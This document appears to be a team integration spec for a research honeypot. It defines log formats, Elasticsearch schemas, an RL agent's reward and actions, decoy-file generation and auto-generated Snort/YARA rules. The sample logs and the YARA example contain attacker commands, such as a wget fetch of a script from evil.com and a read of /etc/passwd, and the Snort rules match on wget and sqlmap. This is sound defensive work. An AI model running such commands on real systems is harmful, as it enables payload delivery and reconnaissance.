# Data Contracts & Integration Spec
### Self-Adaptive Honeypot — Team Reference Document

> **This file is the law.** Every component must produce and consume data exactly as defined here.
> If you want to change a format, update this file first and tell the whole team before touching any code.
> Last thing you want is Pranathi's agent breaking because Parthiv changed a field name.

---

## How the Data Flows (Big Picture)

```
[Attacker Container]
        ↓ attacks
[Cowrie SSH / DVWA Web]  ←→  [RL Agent takes action here]
        ↓ raw logs
[Zeek — network traffic]
        ↓
[Kafka — streams everything]
        ↓
[Elasticsearch — stores everything]
        ↓              ↓                    ↓
[RL Agent]    [Rule Generator]    [Kibana Dashboard]
        ↓              ↓
[Cowrie action]  [.rules / .yar files]
        ↓
[Generative Layer refreshes filesystem]
```

---

## Section 1 — Cowrie SSH Log Format

**Who produces this:** Saarthak (Cowrie container)
**Who consumes this:** Parthiv (pushes to Elasticsearch), Pranathi (RL agent reads), Raheed (rule generator reads)

Cowrie writes logs to `/var/log/cowrie/cowrie.json` — one JSON object per line.

### Standard Cowrie Event Fields (All Events Have These)

```json
{
  "eventid":   "cowrie.command.input",
  "timestamp": "2026-04-07T10:23:00.123456Z",
  "src_ip":    "172.18.0.5",
  "session":   "a3f9b2c1d4e5",
  "sensor":    "honeypot-ssh-01",
  "message":   "CMD: cat /etc/passwd"
}
```

| Field | Type | Description |
|---|---|---|
| `eventid` | string | Event type identifier — see list below |
| `timestamp` | ISO8601 UTC string | When it happened |
| `src_ip` | string (IP) | Attacker's IP address |
| `session` | string | Unique session ID — links all events from one attacker session |
| `sensor` | string | Always `"honeypot-ssh-01"` for our SSH container |
| `message` | string | Human-readable description |

### Event Types We Care About

| `eventid` | Meaning | Extra Fields |
|---|---|---|
| `cowrie.session.connect` | New connection | `src_port` |
| `cowrie.login.failed` | Failed SSH login | `username`, `password` |
| `cowrie.login.success` | Fake login succeeded | `username`, `password` |
| `cowrie.command.input` | Attacker typed a command | `input` (the command string) |
| `cowrie.session.file_download` | Attacker downloaded a file | `url`, `outfile`, `shasum` |
| `cowrie.session.file_upload` | Attacker uploaded a file | `filename`, `shasum` |
| `cowrie.session.closed` | Session ended | `duration` (float, seconds) |
| `cowrie.client.fingerprint` | SSH fingerprint | `fingerprint` |

### Full Example — Login then Command

```json
{"eventid":"cowrie.session.connect","timestamp":"2026-04-07T10:20:00Z","src_ip":"172.18.0.5","session":"a3f9b2c1","sensor":"honeypot-ssh-01","message":"New connection","src_port":54321}
{"eventid":"cowrie.login.failed","timestamp":"2026-04-07T10:20:02Z","src_ip":"172.18.0.5","session":"a3f9b2c1","sensor":"honeypot-ssh-01","message":"Login attempt","username":"admin","password":"admin123"}
{"eventid":"cowrie.login.success","timestamp":"2026-04-07T10:20:10Z","src_ip":"172.18.0.5","session":"a3f9b2c1","sensor":"honeypot-ssh-01","message":"Login succeeded","username":"admin","password":"password1"}
{"eventid":"cowrie.command.input","timestamp":"2026-04-07T10:20:15Z","src_ip":"172.18.0.5","session":"a3f9b2c1","sensor":"honeypot-ssh-01","message":"CMD: cat /etc/passwd","input":"cat /etc/passwd"}
{"eventid":"cowrie.session.closed","timestamp":"2026-04-07T10:22:30Z","src_ip":"172.18.0.5","session":"a3f9b2c1","sensor":"honeypot-ssh-01","message":"Connection lost","duration":150.4}
```

---

## Section 2 — Zeek Network Log Format

**Who produces this:** Parthiv (Zeek running on Docker bridge)
**Who consumes this:** Parthiv (pushes to Elasticsearch), Pranathi (optional — network-level state)

Zeek must be configured to output JSON. Add this to `local.zeek`:
```zeek
redef LogAscii::use_json = T;
```

### conn.log (All Network Connections)

```json
{
  "ts":          1712483380.123,
  "uid":         "CXyi2E1abc123",
  "id.orig_h":   "172.18.0.5",
  "id.orig_p":   45234,
  "id.resp_h":   "172.18.0.10",
  "id.resp_p":   22,
  "proto":       "tcp",
  "service":     "ssh",
  "duration":    45.2,
  "orig_bytes":  1024,
  "resp_bytes":  2048,
  "conn_state":  "SF"
}
```

| Field | Type | Description |
|---|---|---|
| `ts` | float (Unix epoch) | Timestamp |
| `uid` | string | Unique connection ID — links this to ssh.log / http.log |
| `id.orig_h` | string (IP) | Attacker IP |
| `id.resp_h` | string (IP) | Honeypot IP |
| `id.resp_p` | int | Destination port (22=SSH, 80/443=web, 3306=MySQL) |
| `service` | string | Protocol detected (`ssh`, `http`, `mysql`) |
| `duration` | float | Connection duration in seconds |
| `conn_state` | string | `SF`=normal close, `S0`=no reply, `REJ`=rejected |

### ssh.log (SSH Specific)

```json
{
  "ts":            1712483380.123,
  "uid":           "CXyi2E1abc123",
  "id.orig_h":     "172.18.0.5",
  "id.resp_h":     "172.18.0.10",
  "auth_success":  false,
  "auth_attempts": 5,
  "client":        "SSH-2.0-OpenSSH_8.0",
  "direction":     "INBOUND"
}
```

### http.log (Web App — DVWA)

```json
{
  "ts":          1712483400.456,
  "uid":         "DYzj3F2def456",
  "id.orig_h":   "172.18.0.5",
  "id.resp_h":   "172.18.0.11",
  "method":      "POST",
  "host":        "172.18.0.11",
  "uri":         "/login.php",
  "user_agent":  "sqlmap/1.7.0",
  "status_code": 200,
  "resp_mime_types": ["text/html"]
}
```

> **Important:** Always use `uid` to link conn.log entries with ssh.log or http.log entries for the same connection.

---

## Section 3 — Elasticsearch Index Schema

**Who produces this:** Parthiv (sets up indices, ingests logs)
**Who consumes this:** Pranathi (queries for RL state), Raheed (queries for rule generation), Kibana (dashboard)

### Index Names (Stick to These, No Variations)

| Index Name | What It Stores |
|---|---|
| `honeypot-cowrie-events` | Raw Cowrie log events |
| `honeypot-zeek-network` | Zeek conn/ssh/http logs |
| `honeypot-sessions` | Aggregated per-session summaries |
| `honeypot-rl-actions` | Actions taken by the RL agent |
| `honeypot-generated-rules` | Auto-generated Snort/YARA rules |

### Normalized Event Document (What Goes Into `honeypot-cowrie-events`)

After Parthiv reads Cowrie's raw JSON, he normalizes it to this format before indexing:

```json
{
  "@timestamp":    "2026-04-07T10:23:00.000Z",
  "event_type":    "cowrie.command.input",
  "session_id":    "a3f9b2c1",
  "attacker_ip":   "172.18.0.5",
  "service":       "ssh",
  "sensor":        "honeypot-ssh-01",
  "command":       "cat /etc/passwd",
  "username":      "admin",
  "password":      "password1",
  "duration":      null,
  "file_hash":     null,
  "raw_message":   "CMD: cat /etc/passwd"
}
```

| Field | Type | Notes |
|---|---|---|
| `@timestamp` | ISO8601 string | Required — Kibana uses this for time axis |
| `event_type` | keyword | Direct copy of Cowrie `eventid` |
| `session_id` | keyword | The session identifier |
| `attacker_ip` | ip | Attacker's IP |
| `service` | keyword | `"ssh"` or `"web"` or `"db"` |
| `command` | text / null | Only populated for `cowrie.command.input` events |
| `username` | keyword / null | Only for login events |
| `password` | keyword / null | Only for login events |
| `duration` | float / null | Only for `cowrie.session.closed` |
| `file_hash` | keyword / null | Only for file download/upload events |

> **RULE:** Any field that doesn't apply to a specific event type must be set to `null`. Never omit the field entirely — it breaks queries.

### Session Summary Document (What Goes Into `honeypot-sessions`)

This is the aggregated view that the RL agent and rule generator read most. Parthiv builds this after a session closes.

```json
{
  "@timestamp":          "2026-04-07T10:22:30.000Z",
  "session_id":          "a3f9b2c1",
  "attacker_ip":         "172.18.0.5",
  "service":             "ssh",
  "session_duration":    150.4,
  "login_attempts":      4,
  "login_success":       true,
  "commands":            ["cat /etc/passwd", "ls -la", "whoami", "wget http://evil.com/malware.sh"],
  "command_count":       4,
  "unique_commands":     4,
  "files_downloaded":    ["malware.sh"],
  "file_hashes":         ["d41d8cd98f00b204e9800998ecf8427e"],
  "brute_force_detected": true,
  "ttp_count":           3,
  "usernames_tried":     ["root", "admin", "user", "admin"],
  "session_start":       "2026-04-07T10:20:00.000Z",
  "session_end":         "2026-04-07T10:22:30.000Z"
}
```

---

## Section 4 — RL Agent (Pranathi's Component)

**Who produces this:** Pranathi
**Who consumes:** The Cowrie container (executes actions), Elasticsearch (logs actions taken)

### State Vector (What the Agent Sees)

The agent reads from `honeypot-sessions` index in Elasticsearch. The state is a numpy array with this exact structure:

```python
# State space — shape: (10,) — dtype: np.float32
# Index : Field                  : Range
# 0     : session_duration       : 0.0 to 3600.0 (seconds)
# 1     : command_count          : 0.0 to 100.0
# 2     : unique_commands        : 0.0 to 100.0
# 3     : login_attempts         : 0.0 to 50.0
# 4     : login_success          : 0.0 or 1.0 (bool as float)
# 5     : brute_force_detected   : 0.0 or 1.0 (bool as float)
# 6     : files_downloaded_count : 0.0 to 20.0
# 7     : ttp_count              : 0.0 to 20.0
# 8     : service_ssh            : 0.0 or 1.0 (1 if SSH)
# 9     : service_web            : 0.0 or 1.0 (1 if Web)

import numpy as np
from gymnasium import spaces

observation_space = spaces.Box(
    low=np.zeros(10, dtype=np.float32),
    high=np.array([3600, 100, 100, 50, 1, 1, 20, 20, 1, 1], dtype=np.float32),
    dtype=np.float32
)
```

### Action Space (What the Agent Can Do)

```python
# 6 discrete actions
action_space = spaces.Discrete(6)

ACTION_MAP = {
    0: "do_nothing",           # Agent watches, no change
    1: "fake_login_success",   # Let attacker "log in" with fake creds
    2: "show_fake_file",       # Surface a juicy-looking fake file
    3: "slow_response",        # Add delay to responses (simulate busy server)
    4: "show_fake_credentials",# Drop a fake credentials file in home dir
    5: "open_fake_port",       # Expose another fake service port
}
```

### Action Output (What Agent Sends to Cowrie)

When the agent decides on an action, it writes to `honeypot-rl-actions` index AND signals Cowrie via a shared Redis key or a simple REST call. Format:

```json
{
  "@timestamp":   "2026-04-07T10:20:20.000Z",
  "session_id":   "a3f9b2c1",
  "action_id":    2,
  "action_name":  "show_fake_file",
  "parameters": {
    "file_path":  "/home/admin/bank_credentials.txt",
    "file_type":  "credentials"
  },
  "reward":       5.0,
  "episode":      42
}
```

### Reward Function

```python
def calculate_reward(prev_state, current_state, action, fingerprinted):
    reward = 0.0

    # Time in session reward
    duration_delta = current_state[0] - prev_state[0]
    reward += duration_delta * 0.01          # +0.01 per second attacker stays

    # New command discovered
    new_cmds = current_state[1] - prev_state[1]
    reward += new_cmds * 1.0                 # +1 per new command

    # New TTP discovered
    new_ttps = current_state[7] - prev_state[7]
    reward += new_ttps * 5.0                 # +5 per new TTP category

    # File downloaded (attacker went deeper)
    new_files = current_state[6] - prev_state[6]
    reward += new_files * 3.0                # +3 per file downloaded

    # Penalty — attacker fingerprinted the honeypot
    if fingerprinted:
        reward -= 20.0

    return reward
```

---

## Section 5 — Generative Content Layer

**Who produces this:** Raheed + Pranathi (Month 4)
**Who consumes this:** Cowrie filesystem (fake files injected here)

### LiteLLM / OpenRouter API Call Format

```python
import os
from litellm import completion

def generate_fake_content(content_type: str, context: dict) -> str:
    prompt_map = {
        "bash_history": f"Generate a realistic bash history for a Linux server. Only commands, one per line.",
        "credentials":  f"Generate a fake credentials file for a banking app with users and hashed passwords.",
        "document":     f"Generate a fake internal memo about {context.get('topic', 'server maintenance')}.",
        "passwd":       f"Generate 10 lines for /etc/passwd mimicking a Linux server."
    }

    response = completion(
        model=os.getenv("LLM_MODEL", "openrouter/meta-llama/llama-3-8b-instruct:free"),
        messages=[{"role": "user", "content": prompt_map[content_type]}],
        api_key=os.getenv("OPENROUTER_API_KEY")
    )
    return response.choices[0].message.content
```

### Generated File Manifest (Written After Each Generation Run)

```json
{
  "generated_at":  "2026-04-07T10:30:00Z",
  "files": [
    {
      "cowrie_path":  "/home/admin/.bash_history",
      "content_type": "bash_history",
      "character_count": 342,
      "checksum":     "abc123"
    },
    {
      "cowrie_path":  "/home/admin/credentials.txt",
      "content_type": "credentials",
      "character_count": 218,
      "checksum":     "def456"
    }
  ]
}
```

---

## Section 6 — Automatic Rule Generator Output

**Who produces this:** Raheed
**Who consumes this:** Saved as `.rules` and `.yar` files, linked in `honeypot-generated-rules` Elasticsearch index

### Snort Rule Format

```
alert tcp <attacker_ip> any -> $HOME_NET <port> (msg:"<description>"; <options>; sid:<unique_id>; rev:1;)
```

**Our SID (Rule ID) Numbering Convention:**
- Start at `9000001` for SSH rules
- Start at `9001001` for web rules
- Start at `9002001` for DB rules
- Increment by 1 for each new rule in that category

**Examples from session `a3f9b2c1`:**
```
# SSH brute force — attacker IP
alert tcp 172.18.0.5 any -> $HOME_NET 22 (msg:"Honeypot: SSH Brute Force from 172.18.0.5"; flow:to_server; sid:9000001; rev:1;)

# Suspicious command pattern — wget after login
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"Honeypot: SSH session with outbound wget attempt"; flow:established,to_server; content:"wget"; sid:9000002; rev:1;)

# Web attack — SQLMap user agent
alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"Honeypot: SQLMap scanner detected"; flow:to_server,established; content:"sqlmap"; http_header; nocase; sid:9001001; rev:1;)
```

### YARA Rule Format

```yara
rule Honeypot_Session_<session_id_short> {
    meta:
        description  = "<what the attacker did>"
        date         = "<YYYY-MM-DD>"
        session_id   = "<full session id>"
        attacker_ip  = "<ip>"
        generated_by = "honeypot-rule-generator-v1"
    strings:
        $cmd1 = "<command 1 the attacker ran>"
        $cmd2 = "<command 2 the attacker ran>"
        $ip   = "<attacker ip as string>"
    condition:
        any of ($cmd*) or $ip
}
```

**Example:**
```yara
rule Honeypot_Session_a3f9b2c1 {
    meta:
        description  = "Attacker performed SSH brute force then attempted to download malware"
        date         = "2026-04-07"
        session_id   = "a3f9b2c1d4e5"
        attacker_ip  = "172.18.0.5"
        generated_by = "honeypot-rule-generator-v1"
    strings:
        $cmd1 = "cat /etc/passwd"
        $cmd2 = "wget http://evil.com/malware.sh"
        $cmd3 = "whoami"
        $ip   = "172.18.0.5"
    condition:
        any of ($cmd*) or $ip
}
```

### Rule Output Files & Elasticsearch Record

Files saved to: `/rules/output/YYYY-MM-DD/session_<id>.rules` and `/rules/output/YYYY-MM-DD/session_<id>.yar`

Elasticsearch record in `honeypot-generated-rules`:
```json
{
  "@timestamp":    "2026-04-07T10:25:00Z",
  "session_id":    "a3f9b2c1",
  "attacker_ip":   "172.18.0.5",
  "snort_rules":   ["alert tcp 172.18.0.5 ..."],
  "yara_rules":    ["rule Honeypot_Session_a3f9b2c1 { ... }"],
  "rule_count":    3,
  "snort_file":    "/rules/output/2026-04-07/session_a3f9b2c1.rules",
  "yara_file":     "/rules/output/2026-04-07/session_a3f9b2c1.yar",
  "ttps_captured": ["T1110.001", "T1059.004", "T1105"]
}
```

---

## Section 7 — Kafka Topics (If Used)

> Kafka is optional for Phase 1. If you find direct Elasticsearch writes are fast enough, skip Kafka and add it in Phase 2.

| Topic Name | Producer | Consumer | Message Format |
|---|---|---|---|
| `cowrie.events` | Cowrie log forwarder | Elasticsearch ingestor | Cowrie raw JSON (Section 1) |
| `zeek.network` | Zeek log forwarder | Elasticsearch ingestor | Zeek JSON (Section 2) |
| `rl.actions` | RL Agent | Cowrie action handler | Action JSON (Section 4) |
| `rules.generated` | Rule Generator | Elasticsearch ingestor | Rule record JSON (Section 6) |

---

## Section 8 — Docker Network & Port Standards

**Stick to these. No randomizing ports.**

| Container | Service | Internal IP (Docker) | Port |
|---|---|---|---|
| `cowrie` | Fake SSH | 172.18.0.10 | 2222 (mapped to 22 externally) |
| `dvwa` | Fake Web App | 172.18.0.11 | 80 |
| `mysql-fake` | Fake Database | 172.18.0.12 | 3306 |
| `elasticsearch` | Log Storage | 172.18.0.20 | 9200 |
| `kibana` | Dashboard | 172.18.0.21 | 5601 |
| `kafka` | Log Streaming | 172.18.0.22 | 9092 |
| `attacker` | Simulated Attacker | 172.18.0.5 | — |
| `rl-agent` | AI Brain | 172.18.0.30 | — (no exposed port) |
| `rule-gen` | Rule Generator | 172.18.0.31 | — |
| `gen-content` | Generative Layer | 172.18.0.32 | — (Calls Cloud API) |

**Docker network name:** `honeypot-net`
**Subnet:** `172.18.0.0/24`

---

## Section 9 — Python Version & Package Standards

Everyone must use the **same versions**. Add these to `requirements.txt` in the repo root.

```txt
# Core
python==3.10.*

# RL
gymnasium==0.29.1
stable-baselines3==2.3.2
torch==2.2.0
numpy==1.26.4

# Elasticsearch
elasticsearch==8.13.0

# Kafka (optional Phase 1)
kafka-python==2.0.2

# Generative Layer
litellm==1.35.0      # for Cloud LLM routing (OpenRouter)

# Utilities
python-dotenv==1.0.1
pandas==2.2.1
```

---

## Section 10 — Environment Variables (.env file)

**Never hardcode IPs, ports, or credentials in code. Always use .env.**
The `.env` file lives in the repo root and is **git-ignored**. Saarthak creates it and shares it over WhatsApp/Discord once.

```env
# Elasticsearch
ES_HOST=172.18.0.20
ES_PORT=9200
ES_INDEX_COWRIE=honeypot-cowrie-events
ES_INDEX_SESSIONS=honeypot-sessions
ES_INDEX_ACTIONS=honeypot-rl-actions
ES_INDEX_RULES=honeypot-generated-rules

# Kafka (optional)
KAFKA_BROKER=172.18.0.22:9092

# OpenRouter Cloud API
OPENROUTER_API_KEY=your_api_key_here
LLM_MODEL=openrouter/meta-llama/llama-3-8b-instruct:free

# Cowrie
COWRIE_LOG_PATH=/var/log/cowrie/cowrie.json
COWRIE_FAKE_FS_PATH=/home/cowrie/honeyfs

# Rules output
RULES_OUTPUT_DIR=/rules/output

# SID base numbers
SNORT_SID_SSH_BASE=9000001
SNORT_SID_WEB_BASE=9001001
SNORT_SID_DB_BASE=9002001
```

---

## The Golden Rules (Read These Every Time You Start Coding)

1. **Never change a field name without updating this file first** and telling everyone
2. **All timestamps are ISO8601 UTC** — `2026-04-07T10:23:00.000Z` — no exceptions
3. **All IPs are plain strings** — no integer representations
4. **Null fields must be present as `null`** — do not omit missing fields
5. **Session IDs are always strings** — even if they look like numbers
6. **Every Elasticsearch document must have `@timestamp`** — Kibana will break otherwise
7. **Kafka is optional for Phase 1** — get Elasticsearch working first, add Kafka later
8. **SID numbers are unique forever** — check the existing `.rules` files before assigning a new one
9. **The `.env` file is never committed to GitHub** — put `.env` in `.gitignore` on Day 1
10. **Run `check_env(env)` from Stable-Baselines3 before any training** — catches state space issues instantly
